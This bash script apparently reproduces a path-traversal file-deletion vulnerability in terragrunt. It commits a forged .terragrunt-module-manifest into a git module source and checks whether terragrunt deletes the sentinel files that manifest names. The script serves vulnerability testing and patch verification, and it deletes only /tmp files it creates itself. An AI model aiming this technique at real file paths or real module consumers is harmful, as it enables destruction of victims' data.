#!/usr/bin/env bash
# End-to-end reproducer for the manifest path-traversal arbitrary file
# deletion in terragrunt's fileManifest cleanup path.
#
# This uses a *git* source rather than a local file source. Local file
# sources route through FileCopyGetter -> util.CopyFolderContents, which
# applies the TerragruntExcludes hidden-file filter and therefore drops
# the attacker-supplied .terragrunt-module-manifest before it reaches the
# cache. Git, http/tarball, registry, and other go-getter backends do
# not apply that filter -- they unpack the source verbatim, dotfiles
# included. So the realistic attack channel is "anything you would
# `terraform get` from the open internet."
#
# Workflow
#   1. Drop sentinel files in /tmp.
#   2. Build a local git repo (manifest-traversal/attacker-repo.git/)
#      whose committed tree contains a forged
#      .terragrunt-module-manifest naming the sentinel paths.
#   3. Wipe consumer/.terragrunt-cache so terragrunt treats this as a
#      fresh download.
#   4. Run terragrunt from consumer/ with terraform.source pointing at
#      git::file://<absolute-path>/attacker-repo.git.
#   5. Verify whether the sentinel files survived.
#
# Exit code
#   0  patched (sentinels survived)
#   2  vulnerable (one or more sentinels removed)
#   1  setup failure
#
# Configuration
#   TERRAGRUNT_BIN  path to the terragrunt binary (default: terragrunt
#                    on PATH)

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TERRAGRUNT_BIN="${TERRAGRUNT_BIN:-terragrunt}"

SENTINEL_1="/tmp/repro-manifest-traversal-sentinel-1.txt"
SENTINEL_2="/tmp/repro-manifest-traversal-sentinel-2.txt"
SENTINEL_3="/tmp/repro-manifest-traversal-sentinel-3.txt"

ATTACKER_WORKTREE="$SCRIPT_DIR/attacker-repo-worktree"
ATTACKER_BARE="$SCRIPT_DIR/attacker-repo.git"
CONSUMER_DIR="$SCRIPT_DIR/consumer-git"

echo "==> step 1: writing sentinel files in /tmp"
for f in "$SENTINEL_1" "$SENTINEL_2" "$SENTINEL_3"; do
  printf 'this file must survive a terragrunt run\n' > "$f"
  test -f "$f" || { echo "FAIL: could not create $f"; exit 1; }
  echo "    created $f"
done

echo "==> step 2: building forge tool"
( cd "$SCRIPT_DIR/forge" && go build -o "$SCRIPT_DIR/forge_bin" . )

echo "==> step 3: assembling attacker module worktree"
rm -rf "$ATTACKER_WORKTREE" "$ATTACKER_BARE"
mkdir -p "$ATTACKER_WORKTREE"
cp "$SCRIPT_DIR/attacker-module/main.tf" "$ATTACKER_WORKTREE/main.tf"
"$SCRIPT_DIR/forge_bin" \
  "$ATTACKER_WORKTREE/.terragrunt-module-manifest" \
  "$SENTINEL_1" "$SENTINEL_2" "$SENTINEL_3"

echo "==> step 4: committing worktree to a bare git repo"
( cd "$ATTACKER_WORKTREE" \
  && git init -q -b main . \
  && git config user.email repro@example.com \
  && git config user.name  repro \
  && git add -A \
  && git commit -q -m "attacker module" \
)
git clone -q --bare "$ATTACKER_WORKTREE" "$ATTACKER_BARE"

echo "==> step 5: writing consumer/terragrunt.hcl pointing at the bare git repo"
mkdir -p "$CONSUMER_DIR"
cat > "$CONSUMER_DIR/terragrunt.hcl" <<EOF
terraform {
  source = "git::file://$ATTACKER_BARE"
}
EOF

echo "==> step 6: clearing $CONSUMER_DIR/.terragrunt-cache to force a fresh download"
rm -rf "$CONSUMER_DIR/.terragrunt-cache"

echo "==> step 7: invoking terragrunt (init) from $CONSUMER_DIR"
echo "    binary: $($TERRAGRUNT_BIN --version 2>&1 | head -1)"
echo
( cd "$CONSUMER_DIR" && "$TERRAGRUNT_BIN" run -- init -backend=false ) 2>&1 | sed 's/^/    [terragrunt] /' || true
echo

echo "==> step 8: verdict"
deleted=0
survived=0
for f in "$SENTINEL_1" "$SENTINEL_2" "$SENTINEL_3"; do
  if [[ -f "$f" ]]; then
    echo "    [OK]      $f survived"
    survived=$((survived + 1))
  else
    echo "    [DELETED] $f was REMOVED by terragrunt"
    deleted=$((deleted + 1))
  fi
done

echo
if (( deleted > 0 )); then
  echo "*** VULNERABLE *** $deleted of 3 sentinels were deleted via the forged manifest."
  echo "    The terragrunt build under test consumed the attacker-controlled"
  echo "    .terragrunt-module-manifest and ran os.Remove on attacker-supplied paths."
  rc=2
else
  echo "*** PATCHED *** all 3 sentinels survived."
  echo "    Look for 'Skipping untrusted manifest entry' lines in the terragrunt log,"
  echo "    or for the absence of the forged manifest after the fresh-download wipe."
  rc=0
fi

exit "$rc"
